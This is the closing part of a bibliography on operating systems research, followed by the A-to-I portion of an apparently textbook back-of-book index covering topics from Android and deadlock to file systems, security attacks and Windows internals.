WALLACE, G., DOUGLIS, F., QIAN, H., SHILANE, P., SMALDONE, S., CHAMNESS, M., and HSU., W.: “Characteristics of Backup Workloads in Production Systems,” Proc. 10th USENIX Conf. on File and Storage Tech., USENIX, pp. 33-48, 2012.

WANG, L., KHAN, S.U., CHEN, D., KOLODZIEJ, J., RANJAN, R., XU, C.-Z., and ZOMAYA, A.: “Energy-Aware Parallel Task Scheduling in a Cluster,” Future Generation Computer Systems, vol. 29, pp. 1661-1670, Sept. 2013b.

WANG, X., TIPPER, D., and KRISHNAMURTHY, P.: “Wireless Network Virtualization,” Proc. 2013 Int’l Conf. on Computing, Networking, and Commun., IEEE, pp. 818-822, 2013a.

WANG, Y. and LU, P.: “DDS: A Deadlock Detection-Based Scheduling Algorithm for Workflow Computations in HPC Systems with Storage Constraints,” Parallel Comput., vol. 39, pp. 291-305, August 2013.

WATSON, R., ANDERSON, J., LAURIE, B., and KENNAWAY, K.: “A Taste of Capsicum: Practical Capabilities for UNIX,” Commun. of the ACM, vol. 55, pp. 97-104, March 2013.

WEI, M., GRUPP, L., SPADA, F.E., and SWANSON, S.: “Reliably Erasing Data from Flash-Based Solid State Drives,” Proc. Ninth USENIX Conf. on File and Storage Tech., USENIX, pp. 105-118, 2011.

WEI, Y.-H., YANG, C.-Y., KUO, T.-W., HUNG, S.-H., and CHU, Y.-H.: “Energy-Efficient Real-Time Scheduling of Multimedia Tasks on Multi-core Processors,” Proc. 2010 Symp. on Applied Computing, ACM, pp. 258-262, 2010.

WEISER, M., WELCH, B., DEMERS, A., and SHENKER, S.: “Scheduling for Reduced CPU Energy,” Proc. First Symp. on Operating Systems Design and Implementation, USENIX, pp. 13-23, 1994.

WEISSEL, A.: Operating System Services for Task-Specific Power Management: Novel Approaches to Energy-Aware Embedded Linux, AV Akademikerverlag, 2012.

WENTZLAFF, D., GRUENWALD III, C., BECKMANN, N., MODZELEWSKI, K., BELAY, A., YOUSEFF, L., MILLER, J., and AGARWAL, A.: “An Operating System for Multicore and Clouds: Mechanisms and Implementation,” Proc. Cloud Computing, ACM, June 2010.

WENTZLAFF, D., JACKSON, C.J., GRIFFIN, P., and AGARWAL, A.: “Configurable Finegrain Protection for Multicore Processor Virtualization,” Proc. 39th Int’l Symp. on Computer Arch., ACM, pp. 464-475, 2012.

WHITAKER, A., COX, R.S., SHAW, M, and GRIBBLE, S.D.: “Rethinking the Design of Virtual Machine Monitors,” Computer, vol. 38, pp. 57-62, May 2005.

WHITAKER, A., SHAW, M, and GRIBBLE, S.D.: “Scale and Performance in the Denali Isolation Kernel,” ACM SIGOPS Operating Systems Rev., vol. 36, pp. 195-209, Jan. 2002.

WILLIAMS, D., JAMJOOM, H., and WEATHERSPOON, H.: “The Xen-Blanket: Virtualize Once, Run Everywhere,” Proc. Seventh European Conf. on Computer Systems (EUROSYS), ACM, 2012.

WIRTH, N.: “A Plea for Lean Software,” Computer, vol. 28, pp. 64-68, Feb. 1995.
WU, N., ZHOU, M., and HU, U.: “One-Step Look-Ahead Maximally Permissive Deadlock Control of AMS by Using Petri Nets,” ACM Trans. Embed. Comput. Syst. „#, vol. 12, Art. 10, pp. 10:1-10:23, Jan. 2013.

WULF, W.A., COHEN, E.S., CORWIN, W.M., JONES, A.K., LEVIN, R., PIERSON, C., and POLLACK, F.J.: “HYDRA: The Kernel of a Multiprocessor Operating System,” Commun. of the ACM, vol. 17, pp. 337-345, June 1974.

YANG, J., TWOHEY, P., ENGLER, D., and MUSUVATHI, M.: “Using Model Checking to Find Serious File System Errors,” ACM Trans. on Computer Systems, vol. 24, pp. 393-423, 2006.

YEH, T., and CHENG, W.: “Improving Fault Tolerance through Crash Recovery,” Proc. 2012 Int’l Symp. on Biometrics and Security Tech., IEEE, pp. 15-22, 2012.

YOUNG, M., TEVANIAN, A., Jr., RASHID, R., GOLUB, D., EPPINGER, J., CHEW, J., BOLOSKY, W., BLACK, D., and BARON, R.: “The Duality of Memory and Communication in the Implementation of a Multiprocessor Operating System,” Proc. 11th Symp. on Operating Systems Principles, ACM, pp. 63-76, 1987.

YUAN, D., LEWANDOWSKI, C., and CROSS, B.: “Building a Green Unified Computing IT Laboratory through Virtualization,” J. Computing Sciences in Colleges, vol. 28, pp. 76-83, June 2013.

YUAN, J., JIANG, X., ZHONG, L., and YU, H.: “Energy Aware Resource Scheduling Algorithm for Data Center Using Reinforcement Learning,” Proc. Fifth Int’l Conf. on Intelligent Computation Tech. and Automation, IEEE, pp. 435-438, 2012.

YUAN, W., and NAHRSTEDT, K.: “Energy-Efficient CPU Scheduling for Multimedia Systems,” ACM Trans. on Computer Systems, ACM, vol. 24, pp. 292-331, Aug. 2006.

ZACHARY, G.P.: Showstopper, New York: Maxwell Macmillan, 1994.
ZAHORJAN, J., LAZOWSKA, E.D., and EAGER, D.L.: “The Effect of Scheduling Discipline on Spin Overhead in Shared Memory Parallel Systems,” IEEE Trans. on Parallel and Distr. Systems, vol. 2, pp. 180-198, April 1991.

ZEKAUSKAS, M.J., SAWDON, W.A., and BERSHAD, B.N.: “Software Write Detection for a Distributed Shared Memory,” Proc. First Symp. on Operating Systems Design and Implementation, USENIX, pp. 87-100, 1994.

ZHANG, C., WEI, T., CHEN, Z., DUAN, L., SZEKERES, L., MCCAMANT, S., SONG, D., and ZOU, W.: “Practical Control Flow Integrity and Randomization for Binary Executables,” Proc. IEEE Symp. on Security and Privacy, IEEE, pp. 559-573, 2013b.

ZHANG, F., CHEN, J., CHEN, H., and ZANG, B.: “CloudVisor: Retrofitting Protection of Virtual Machines in Multi-Tenant Cloud with Nested Virtualization,” Proc. 23rd Symp. on Operating Systems Principles, ACM, 2011.

ZHANG, M., and SEKAR, R.: “Control Flow Integrity for COTS Binaries,” Proc. 22nd USENIX Security Symp., USENIX, pp. 337-352, 2013.

ZHANG, X., DAVIS, K., and JIANG, S.: “iTransformer: Using SSD to Improve Disk Scheduling for High-Performance I/O,” Proc. 26th Int’l Parallel and Distributed Processing Symp., IEEE, pp. 715-726, 2012b.

ZHANG, Y., LIU, J., and KANDEMIR, M.: “Software-Directed Data Access Scheduling for Reducing Disk Energy Consumption,” Proc. 32nd Int’l Conf. on Distributed Computer Systems, IEEE, pp. 596-605, 2012a.

ZHANG, Y., SOUNDARARAJAN, G., STORER, M.W., BAIRAVASUNDARAM, L., SUBBIAH, S., ARPACI-DUSSEAU, A.C., and ARPACI-DUSSEAU, R.H.: “Warming Up Storage-Level Caches with Bonfire,” Proc. 11th Conf. on File and Storage Technologies, USENIX, 2013a.

ZHENG, H., ZHANG, X., WANG, E., WU, N., and DONG, X.: “Achieving High Reliability on Linux for K2 System,” Proc. 11th Int’l Conf. on Computer and Information Science, IEEE, pp. 107-112, 2012.

ZHOU, B., KULKARNI, M., and BAGCHI, S.: “ABHRANTA: Locating Bugs that Manifest at Large System Scales,” Proc. Eighth USENIX Workshop on Hot Topics in System Dependability, USENIX, 2012.

ZHURAVLEV, S., SAEZ, J.C., BLAGODUROV, S., FEDOROVA, A., and PRIETO, M.: “Survey of scheduling techniques for addressing shared resources in multicore processors,” Computing Surveys, ACM , vol 45, Number 1, Art. 4, 2012.

ZOBEL, D.: “The Deadlock Problem: A Classifying Bibliography,” ACM SIGOPS Operating Systems Rev., vol. 17, pp. 6-16, Oct. 1983.

ZUBERI, K.M., PILLAI, P., and SHIN, K.G.: “EMERALDS: A Small-Memory Real-Time Microkernel,” Proc. 17th Symp. on Operating Systems Principles, ACM, pp. 277-299, 1999.

ZWICKY, E.D.: “Torture-Testing Backup and Archive Programs: Things You Ought to Know But Probably Would Rather Not,” Proc. Fifth Conf. on Large Installation Systems Admin., USENIX, pp. 181-190, 1991.

## INDEX

This page intentionally left blank

## INDEX

## A

Absolute path, 776
Absolute path name, 277
Abstraction, 982
Access, 116, 617, 657, 672, 801
Access control entry,
Windows, 968
Access control list, 605-608, 874
Access to resources, 602-611
Access token, 967
Access violation, 936
Accountability, 596
ACE (see Access Control Entry)
Acknowledged datagram service, 573
Acknowledgement message, 144
Acknowledgement packet, 573
ACL (see Access Control List)
ACM Software System Award, 500
ACPI (see Advanced Configuration and Power Interface)
Active attack, 600
Active message, 556
ActiveX control, 678, 906
Activity, Android, 827-831
Activity manager, 827
Ada, 7
Adapter, I/O, 339-340
AddAccessAllowedAce, 970
AddAccessDeniedAce, 970
Adding a level of indirection, 500
Address space, 39, 41, 185-194
Address-space layout randomization, 647-648, 973
Administrator, 41
ADSL (see Asymmetric Digital Subscriber Line)
Advanced configuration and power interface, 425, 880
Advanced LPC, 890
Adversary, 599
Adware, 680
Affinitized thread, 908
Affinity, core, 551
Affinity scheduling, multiprocessor, 541
Agent, 697
Aging, 162, 214
AIDL (see Android Interface Definition Language)
Aiken, Howard, 7
Alarm, 118, 390, 739
Alarm signal, 40

Algorithmic paradigm, 989
Allocating dedicated devices, 366
ALPC (see Advanced LPC)
Alternate data stream, 958
Amoeba, 610
Analytical engine, 7
Andreesen, Marc, 77
Android, 20, 802-849
history, 803-807
Android 1.0, 805
Android activity, 827-831
Android application, 824-836
Android application sandbox, 838
Android architecture, 809-810
Android binder, 816-822
Android binder IPC, 815-824
Android content provider, 834-836
Android Dalvik, 814-815
Android design, 807-808
Android extensions to Linux, 810-814
Android framework, 810
Android init, 809
Android intent, 836-837
Android interface definition language, 822
Android open source project, 803
Android out-of-memory killer, 813-814
Android package, 825
Android package manager, 826
Android process lifecycle, 846
Android process model, 844
Android receiver, 833-834
Android security, 838-844
Android service, 831-833
Android software development kit, 805
Android suspend blocker, 810
Android wake lock, 810-813
Android zygote, 809-810, 815-816, 845-846
Antivirus technique, 687-693
behavioral checker, 691-692
integrity checker, 691
AOSP (see Android Open Source Project)
APC (see Asynchronous Procedure Call)
APK (see Android Package)
Aperiodic real-time system, 164
API (see Application Programming Interface)
App, 36
AppContainer, 866
Apple Macintosh (see Mac)
Applet, 697
Application programming interface, 60, 483
I/O in Windows, 945-948
Memory management in Windows, 931-932
Native NT, 868-871
Process management in Windows, 914-919
Security in Windows, 969-970
Win32, 60-62, 871-875
Application rootkit, 681
Application sandbox, Android, 838
Application verifier, 901
Architectural coherence, 987-988
Architecture, computer, 4
Archive file, 269-270
ASLR (see Address Space Layout Randomization)
Associative memory, 202
Asymmetric digital subscriber line, 771
Asynchronous call, 554-556
Asynchronous I/O, 352
Asynchronous procedure call, 878, 885-886
ATA, 29
Atanasoff, John, 7
Atomic action, 130
Atomic transaction, 296
Attack
buffer overflow, 640-642, 649
bypassing ASLR, 647
code reuse, 645-646
command injection, 655-656
dangling pointer, 652-653
format string, 649-652
insider, 657-660
integer overflow, 654-655
noncontrol-flow diverting, 648-649
null pointer, 653-654
outsider, 639-657
return-oriented-programming, 645-647
return-to-libc, 645
time of check to time of use, 656-657
TOCTOU, 656-657
Attacker, 599
Attribute, file, 271
Authentication, 626-638
password, 627-632
Authentication for message passing, 144
Authentication using biometrics, 636-638
Authentication using physical objects, 633-636
Authenticity, 596
Automounting, NFS, 794
AV disk, 385
Availability, 596
Available resource vector, 446

## B

B programming language, 715
Babbage, Charles, 7, 13
Back door, 658-660
Backing store for paging, 237-239
Backing up a file system, 306-311
Bad disk sector, 383
Bad-news diode, 1020
Balance set manager, 939
Ballooning, 490
Bandwidth reservation, Windows, 945
Banker’s algorithm
multiple resources, 454-456
single resource, 453-454
Barrier, 146-148
Base priority, Windows scheduling, 924
Base record, 954
Base register, 186
Basic block, 480
Basic input output system, 34, 182
Batch system, 8
Batch-system scheduling, 156-158
Battery management, 417-418, 424-425
Battery-powered computer, 1025-1026
Behavioral checker, 691
Bell-LaPadula model, 613-614
Berkeley software distribution, 14, 717
Berkeley UNIX, 717-718
Berners-Lee, Tim, 77, 576
Berry, Clifford, 7
Best fit algorithm, 193
Biba model, 614-615
Big kernel lock, 533, 750
Big.Little procesor, 530
Binary exponential backoff, 537, 570
Binary semaphore, 132
Binary translation, 71, 476, 479
dynamic, 503
Binder, Android, 821
Binder interfaces and AIDL, 822
Binder IPC, Android, 815-824
Binder kernel module, Android, 816-820
Binder user-space API, Android, 821-822
BinderProxy, Android, 821
Binding time, 1001
Biometric authentication, 636-638
BIOS (see Basic Input Output System)
BitLocker, 894, 964, 976
Bitmap, 411-414, 412
Bitmaps for memory management, 191
Black hat, 597
Blackberry, 19
Block cache, 315-317
Block device, 338, 359
Block read ahead, 317-318
Block size, 300-302, 367
Block special file, 44, 268, 768
Block started by symbol, 754
Blocked proces, 92
Blocking call, 553-556
Blocking network, 524
Blue pill rootkit, 680
Blue screen of death, 888
Bluetooth, 399
Boot block, 281
Boot driver, 893
Boot sector virus, 669-670
Booting, 34-35
Booting Linux, 751-753
Booting Windows, 893-894
Bot, 598
Botnet, 597-598, 660
Bottom-up implementation, 1003-1004
Bounded-buffer problem, 128-130
Bridge, LAN, 570
Brinch Hansen, Per, 137
Brk, 56, 755, 757
Broker process, 866
Brooks, Fred, 11, 981, 1018-1019
Browser hijacking, 679
Brute force, 1009
BSD (see Berkeley Software Distribution)
BSOD (see Blue Screen Of Death)
BSS (see Block Started by Symbol)
Buddy algorithm, Linux, 761
Buffer cache, 315-317
Buffer overflow, 640-642, 649, 675
Buffered I/O, 352
Buffering, 363-365
Burst mode, 346
Bus, 20, 32-34
DMA, 33
ISA, 32
parallel, 32
PCI, 32
PCIe, 32-34
SCSI, 33
serial, 32
USB, 33

Busy waiting, 30, 122, 124, 354
Bypassing ASLR, 647-648
Byron, Lord, 7
Byte code, 702

## C

C language, introduction, 73-77
C preprocessor, 75
C programming language, 715
C-list, 608
CA (see Certification Authority)
Cache, 100
Linux, 772
Windows, 942-943
write-through, 317
Cache (L1, L2, L3), 527
Cache hit, 25
Cache line, 25, 521
Cache manager, 889
Cache-coherence protocol, 521
Cache-coherent NUMA, 525
Caching, 1015
file system, 315-317
Canonical mode, 395
Capability, 608-611
Amoeba, 610
cryptographically protected, 609
Hydra, 610
IBM AS/400, 609
kernel, 609
tagged architecture, 609
Capability list, 608
Capacitive screen, 415
Carriero, Nick, 584
Cathode ray tube, 340
Cavity virus, 668
CC-NUMA (see Cache-Coherent NUMA)
CD-ROM file system, 325-331
CDC 6600, 49
CDD (see Compatibility Definition Document, Android)
CERT (see Computer Emergency Response Team)
Certificate, 624
Certification authority, 624
CFS (see Completely Fair Scheduler)
Challenge-response authentication, 632
Character device, 338, 359
Character special file, 44, 268, 768
Chdir, 54, 59, 667, 745, 783
Checkerboarding, 243
Checkpointing, virtual machine migration, 497
Chief programmer team, 1020
Child process, 40, 90, 734
Chip multiprocessor, 528
Chmod, 54, 59, 664, 801
Chown, 664
Chromebook, 417
ChromeOS, 417
CIA, 596
Ciphertext, 620
Circuit switching, 548-550
Circular buffer, 364
Class driver, 893
Classical IPC problems, 167-172
dining philosophers, 167-170
readers and writers, 171-172
Classical thread model, 102
Cleaner, LFS, 294
Cleaning policy, 232
Client, 68
Client stub, 556
Client-server system, 68, 995-997
Clock, 388-394
Clock hardware, 388-389
Clock mode, one-shot, 389
square-wave, 389
Clock page replacement algorithm, 212-213
Clock software, 390-392
Clock tick, 389
Clone, 744, 745, 746
Close, 54, 57, 272, 298, 696, 770, 781, 795
Closedir, 280
Cloud, 473, 495-497
definition, 495
Clouds as a service, 496
Cloud computing, 13
Cluster computer, 545
Cluster of workstations, 545
Cluster size, 322
CMOS, 27
CMP (see Chip MultiProcessor)
CMS (see Conversational Monitor System)
Co-scheduling, multiprocessor, 544
Code injection attack, 644
Code integrity, 974
Code reuse attack, 645-647

Code review, 659
Code signing, 693-694
Coherency wall, 528
Colossus, 7
COM (see Component Object Model)
Command injection attack, 655-656
Command interpreter, 39
Committed page, Windows, 929
Common criteria, 890
Common object request broker architecture, 582-584
Communication, synchronous vs. asynchronous, 1004-1005
Communication deadlock, 459-461
Communication software, 550-552
Companion virus, 665-666
Compatibility definition document, Android, 803
Compatible Time Sharing System, 12
Competition synchronization, 459
Completely fair scheduler, Linux, 749
Component object model, 875
Compute-bound process, 152
Computer emergency response team, 676
Computer hardware review, 20-35
Condition variable, 136, 139-140
Conditions for resource deadlock, 440
Confidentiality, 596
Configuration manager, 890
Confinement problem, 615-617
Connected standby, 965
Connection-oriented service, 572
Connectionless service, 572
Consistency, file system, 312-314
Content provider, Android, 834-836
Content-based page sharing, 494
Context data structure in Windows, 913
Context switch, 28, 159
Contiguous allocation, 282-283
Control object, 883
Control program for microcomputers, 15-16
Conversational Monitor System, 70
Cooked mode, 395
Coordination-based middleware, 584-587
Copy on write, 90, 229, 494, 497, 742, 931
CopyFile, 872
CORBA (see Common Object Request Broker Architecture)
Core, 24, 527
Core image, 39
Core memory, 26
Covert channel, 615-619
COW (see Cluster Of Workstations)
CP-40, 474
CP-67, 474
CP/CMS, 474
CP/M, 15
CPM (see Control Program for Microcomputers)
CPU-bound process, 152
CR3, 476
Cracker, 597
Crash recovery in stable storage, 386
Creat, 780, 781, 783
CreateFile, 872, 903, 969
CreateFileMapping, 932
CreateProcess, 90, 867, 914, 919, 921, 969
CreateProcessA, 871
CreateProcessW, 871
CreateSemaphore, 897, 917
Critical region, 121-122
Critical section, 121-122
Windows, 918
Crossbar switch, 522
Crosspoint, 522
CRT (see Cathode Ray Tube)
Cryptographic hash function, 622
Cryptography, 600, 619-626
public-key, 621-622
secret-key, 620-621
CS (see Connected Standby)
CTSS (see Compatible Time Sharing System)
Cube, multicomputer, 547
CUDA, 529
Current allocation matrix, 446
Current directory, 278
Current priority, Windows scheduling, 924
Current virtual time, 218
Cutler, David, 17, 859, 909
Cyberwarfare, 598
Cycle stealing, 346
Cylinder, 28
Cylinder skew, 376

## D

D-space, 227
DACL (see Discretionary ACL)
Daemon, 89, 368, 734
DAG (see Directed Acyclic Graph)

Dalvik, 814-815
Dangling pointer attack, 652-653
Darwin, Charles, 47
Data confidentiality, 596
Data execution prevention, 644, 645-645
Data paradigm, 989-991
Data rate for devices, 339
Data segment, 56, 754
Datagram service, 573
Deadlock, 435-465
banker’s algorithm for multiple resources, 454-456
banker’s algorithm for single resource, 453-454
checkpointing to recover from, 449
introduction, 439-443
resource, 439
safe state, 452-453
unsafe state, 452-453
Deadlock avoidance, 450-456
Deadlock detection, 444-448
Deadlock modeling, 440-443
Deadlock prevention, 456-458
attacking circular wait, 457-458
attacking hold and wait, 456-457
attacking mutual exclusion, 456
attacking no preemption, 457
Deadlock recovery, 449, 449-450
killing processes, 450
preemption, 449
rollback, 449
Deadlock trajectory, 450-451
DebugPortHandle, 869
Dedicated I/O device, 366
Deduplication of memory, 489, 494
Default data stream, 958
Defense in depth, 684, 973
Defenses against malware, 684-704
Deferred procedure call, 883-885
Defragmenting a disk, 319-320
Degree of multiprogramming, 96
Dekker’s algorithm, 124
DeleteAce, 970
Demand paging, 215
Denial-of-service attack, 596
Dentry data structure, Linux, 784
DEP (see Data Execution Prevention)
Design, Android, 807-808
Design issues for message passing, 144-145
Design issues for paging systems, 222-233
Design techniques for operating systems brute force, 1009
caching, 1015-1016
error checking, 1009
exploiting locality, 1017
hiding the hardware, 1005
indirection, 1007
optimize the common case, 1017-1018
reentrancy, 1009
reusability, 1008
space-time trade-offs, 1012-1015
using hints, 1016
Device context, 410
Device controller, 339-340
Device domain, 492
Device driver, 29, 357-361
Windows, 891-893, 948
Device driver as user process, 358
Device driver interface 362-363
Device driver virus, 671
Device independence, 361
Device independent bitmap, 412
Device isolation, 491
Device object, 870
Device pass through, 491
Device stack, 891
Windows, 951
Device-independent block size, 367
DFSS (see Dynamic Fair-Share Scheduling)
Diameter, multicomputer, 547
DIB (see Device Independent Bitmap)
Die, 527
Digital Research, 15
Digital rights management, 17, 879
Digital signature, 623
Digram, 621
Dining philosophers problem, 167-170
Direct media interface, 33
Direct memory access, 31, 344-347, 355
Directed acyclic graph, 291
Directory, 42-43, 268
file, 276-281
hierarchical, 276-277
single-level, 276
Directory hierarchy, 578-579
Directory management system calls, 57-59
Directory operation, 280-281
Directory-based multiprocessor, 525-527
Dirty bit, 200
Disabling interrupts, 122-123

Disco, 474
Discretionary access control, 612
Discretionary ACL, 967
Disk, 27-28, 49-50
Disk controller cache, 382
Disk driver, 4
Disk error handling, 382-385
Disk formatting, 375-379
Disk hardware, 369-375
Disk interleaving, 378
Disk operating system, 15
Disk properties, 370
Disk quota, 305-306
Disk recalibration, 384
Disk scheduling algorithms, 379-382
elevator, 380-382
first-come, first-served, 379-380
shortest seek first, 380
Disk-arm motion, 318-319
Disk-space management, 300-306
Disks, 369-388
Dispatcher object, 883, 886-887
Dispatcher thread, 100
Dispatcher header, 886
Distributed operating system, 18-19
Distributed shared memory, 233, 558-563
Distributed system, 519, 566-587
loosely coupled, 519
tightly coupled, 519
DLL (see Dynamic Link Library)
DLL hell, 905
DMA (see Direct Memory Access)
DMI (see Direct Media Interface)
DNS (see Domain Name System)
Document-based middleware, 576-577
Domain 492, 603
Domain name system, 575
DOS (see Disk Operating System)
Double buffering, 364
Double indirect block, 324, 789
Double interleaving, 378
Double torus, multicomputer, 547
Down operation on semaphore, 130
DPC (see Deferred Procedure Call)
Drive-by download, 639, 677
Driver, disk, 4
Driver object, 870
Windows, 944
Driver verifier, 948
Driver-kernel interface, Linux, 772
DRM (see Digital Rights Management)
DSM (see Distributed Shared Memory)
Dual-use technology, 597
Dump, file system, 306-311
DuplicateHandle, 918
Dynamic binary translation, 503
Dynamic disk, Windows, 944
Dynamic fair-share scheduling, 927
Dynamic link library, 63, 229, 862, 905-908
Dynamic relocation, 186

## E

e-Cos, 185
Early binding, 1001
ECC (see Error-Correcting Code)
Echoing, 396
Eckert, J. Presper, 7
EEPROM (see Electrically Erasable PROM)
Effective UID, 800
Efficiency, hypervisor, 475
EFS (see Encryption File System)
Electrically Erasable PROM, 26
Elevator algorithm, disk, 380-382
Linux, 773
Embedded system, 37, 1026
Encapsulating mobile code, 697-703
Encapsulation, hardware-independent, 507
Encryption file system, 964
End-to-end argument, 995
Energy management (see Power management)
Engelbart, Doug, 16, 405
ENIAC, 7, 417, 517
EnterCriticalSection, 918
EPT (see Extended Page Table)
Errno variable, 116
Error checking, 1010
Error handling, 351
disk, 382-385
Error reporting, 366
Error-correcting code, 340
Escape character, 397
Escape sequence, 399
ESX server, 481, 511-513
Ethernet, 569-570
Event, Windows, 918
Event-driven paradigm, 989
Evolution of WMware workstation, 511

Evolution of Linux, 714-703
Evolution of Windows, 857-864
Example file systems, 320-331
ExceptPortHandle, 869
Exclusive lock, 779
Exec, 55, 56, 82, 112, 604, 642, 669, 737, 738, 742, 758, 815, 844
Executable, 862
Executable file (UNIX), 269-270
Executable program virus, 666-668
Executive, Windows, 877, 887
Execution paradigm, 989
Execve, 54-56, 89
ExFAT file system, 266
Existing resource vector, 446
Exit, 56, 90, 91, 696, 738, 54
ExitProcess, 91
Exokernel, 73, 995
Explicit intent, Android, 836
Exploit, 594
Exploiting locality, 1017
Exploiting software, 639-657
Ext2 file system, 320, 785-790
Ext3 file system, 320, 790
Ext4 file system, 790-792
Extended page table, 488
Extensible system, 997
Extent, 284, 791
External fragmentation, 243
External pager, 239-240

## F

Fair-share scheduling, 163-164
Failure isolation, 983
False sharing in DSM, 561
FAT (see File Allocation Table)
FAT-16 file system, 265, 952
FAT-32 file system, 265, 952
FCFS (see First-Come, First-Served algorithm)
Fcntl, 783
Fiber, Windows, 909-911
Fiber management API calls in Windows, 914-919
Fidelity, hypervisor, 475
FIFO (see First-In, First-Out page replacement)
File, 41-44, 264
block special, 768
character special, 768
File access, 270-271
File allocation table, 285, 285-286
File attribute, 271, 271-272
File compression, NTFS, 962-963
File data structure, Linux, 785
File descriptor, 43, 275, 781
File encryption, NTFS, 963-964
File extension, 266-267
File handle, NFS, 794
File key, 268
File link, 291
File management system calls, 56-57
File mapping, 873
File metadata, 271
File naming, 265-267
File operation, 272-273
File sharing, 580-582
File structure, 267-268
File system, 263-332
CD-ROM, 325-331
contiguous allocation, 282-283
ExFAT
ext2, 320, 785-790
ext3, 320, 295
ext4, 790-792
FAT, 285-286
FAT-16, 952
FAT-32, 952
ISO 9660, 326-331
Joliet, 330-331
journaling, 295-296
linked-list allocation, 284-285
Linux, 775-798
MS-DOS, 320-323
network, 297
NTFS, 295, 95-964
Rock Ridge, 329-331
UNIX V7, 323-325
virtual, 296-299
Windows, 952-964
File-system backup, 306-311
File-system block size, 300-302
File-system calls in Linux, 780-783
File-system cache, 315-317
File-system consistency, 312-314
File-system examples, 320-331
File-system filter driver, 892

File-system fragmentation, 283-284
File-system implementation, 281-299
File-system layout, 281-282
File-system management, 299-320
File-system performance, 314-319
File-system structure, Windows NT, 954-958
Linux, 785-792
File-system-based middleware, 577-582
File type, 268-270
File usage, example, 273-276
Filter, 892
Filter driver, Windows, 952
Finger daemon, 675
Finite-state machine, 102
Firewall, 685-687
personal, 687
stateful, 687
stateless, 686
Firmware, 893
Firmware rootkit, 680
First fit algorithm, 192
First-come, first-served disk scheduling, 379-380
first-served scheduling, 156-157
First-in, first-out page replacement algorithm, 211
Flash device, 909
Flash memory, 26
Flashing, 893
Floppy disk, 370
Fly-by mode, 346
Folder, 276
Font, 413-414
Fork, 53, 53-55, 54, 55, 61, 82, 89, 90, 106, 107, 228, 462, 463, 534, 718, 734, 736, 737, 741, 742, 743, 744, 745, 763, 815, 844, 845, 851, 852
Formal security model, 611-619
Format string attack, 649-651
Formatting, disk, 375-379
FORTRAN, 9
Fragmentation, file systems, 283-284
Free, 653
Free block management, 303-305
FreeBSD, 18
Fsck, 312
Fstat, 57, 782
Fsuid, 854
Fsync, 767
Full virtualization, 476
Function pointer in C, 644
Fundamental concepts of Windows security, 967
Futex, 134-135

## G

Gabor wavelet, 637
Gadget, 646
Gang scheduling, multiprocessor, 543-545
Gassée, Jean-Louis, 405
Gates, Bill, 14, 858
GCC (see Gnu C compiler)
GDI (see Graphics Device Interface)
GDT (see Global Descriptor Table)
Gelernter, David, 584
General-purpose GPU, 529
Generic right, capability, 610
Getpid, 734
GetTokenInformation, 967
Getty, 752
Ghosting, 415
GID (see Group ID)
Global descriptor table, 249
Global page replacement, 223-224
Global variable, 116
Gnome, 18
GNU C compiler, 721
GNU Public License, 722
Goals of I/O software, 351-352
Goals of operating system design, 982-983
Goat file, 687
Goldberg, Robert, 474
Google Play, 807
GPGPU (see General-Purpose GPU)
GPL (see GNU Public License)
GPT (see GUID Partition Table)
GPU (see Graphics Processing Unit)
Grace period, 148
Grand unified bootloader, 751
Graph-theoretic processor allocation, 564-565
Graphical user interface, 1-2, 16, 405-414, 719, 802
Graphics adapter, 405
Graphics device interface, 410
Graphics processing unit, 24, 529
Grid, multicomputer, 547
Group, ACL, 606
Group ID, 40, 604, 799
GRUB (see GRand Unified Bootloader)
Guaranteed scheduling algorithm, 162

Guest operating system, 72, 477, 505
Guest physical address, 488
Guest virtual address, 488
Guest-induced page fault, 487
GUI (see Graphical User Interface)
GUID partition table, 378

## H

Hacker, 597
HAL (see Hardware Abstraction Layer)
Handheld computer operating system, 36
Handle, 92, 868, 897-898
Hard fault, 936
Hard link, 281
Hard miss, 204
Hard real-time system, 38, 164
Hardening, 600
Hardware abstraction layer, 878-882, 880
Hardware issues for power management, 418-419
Hardware support, nested page tables, 488
Hardware-independent encapsulation, 507
Head skew, 376
Header file, 74
Headless workstation, 546
Heap, 755
Heap feng shui, 653
Heap spraying, 642
Heterogeneous multicore chip 529-530
Hibernation, 964
Hiding the hardware, 1005
Hierarchical directory structure, 276-277
Hierarchical file system, 276-277
High-level format of disk, 379
High-resolution timer, Linux, 747
Hint, 1016
History of disks, 49
History of memory, 48
History of operating systems, 6-20
Android, 803-807
fifth generation, 19-20
first generation, 7-8
fourth generation, 15-19
Linux, 714-722
MINIX, 719-720
second generation, 8-9
third generation, 9-14
Windows, 857-865
History of protection hardware, 58
History of virtual memory, 50
History of virtualization, 473-474
History of VMware, 498-499
Hive, 875
Hoare, C.A.R, 137
Honeypot, 697
Host, 461, 571
Host operating system, 72, 477, 508
Host physical address, 488
Hosted hypervisor, 478
Huge page, Linux, 763
Hungarian notation, 408
Hybrid thread, 112-113
Hydra, 610
Hyper-V, 474, 879
Hypercall, 477, 483
Hypercube, multicomputer, 547
Hyperlink, 576
Hyperthreading, 23-24
Hypervisor, 472, 475, 879
hosted, 478
type 1, 70-72, 477-478
type 2,70,477-478,481
Hypervisor rootkit, 680
Hypervisor-induced page fault, 487
Hypervisors vs. microkernels, 483-485

## I

I-node, 58, 286-287, 325, 784
I-node table, 788
I-space, 227
I/O, interrupt driven
I/O API calls in Windows, 945-948
I/O completion port, 948
I/O device, 28-31, 338
I/O hardware, 337-351
I/O in Linux, 767-775
I/O in Windows, 943-952
I/O manager, 888
I/O MMU, 491
I/O port, 341
I/O port space, 30, 341
I/O request packet, 902, 950
I/O scheduler, Linux, 773
I/O software, 351-355
user-space, 367-369

I/O software layers, 356-369
I/O system calls in Linux, 770-771
I/O system layers, 368
I/O using DMA, 355
I/O virtualization, 490-493
I/O-bound process, 152
IAAS (see Infrastructure As A Service)
IAT (see Import Address Table)
IBinder, Android, 821
IBM AS/400, 609
IBM PC, 15
IC (see Integrated Circuit)
Icon, 405
IDE (see Integrated Drive Electronics)
Ideal processor, Windows, 925
Idempotent operation, 296
Identity theft, 661
IDL (see Interface Definition Language)
IDS (see Intrusion Detection System)
IF (see Interrupt Flag)
IIOP (see Internet InterOrb Protocol)
Immediate file, 958
Impersonation, 968
Implementation, RPC, 557
Implementation issues, paging, 233-240 segmentation, 243-252
Implementation of an operating system, 993-1010
Implementation of I/O in Linux, 771-774
Implementation of I/O in Windows, 948-952
Implementation of memory management in Linux, 758-764
Implementation of memory management in Windows, 933-942
Implementation of processes, 94-95
Implementation of processes in Linux, 740-746
Implementation of processes in Windows, 919-927
Implementation of security in Linux, 801-802
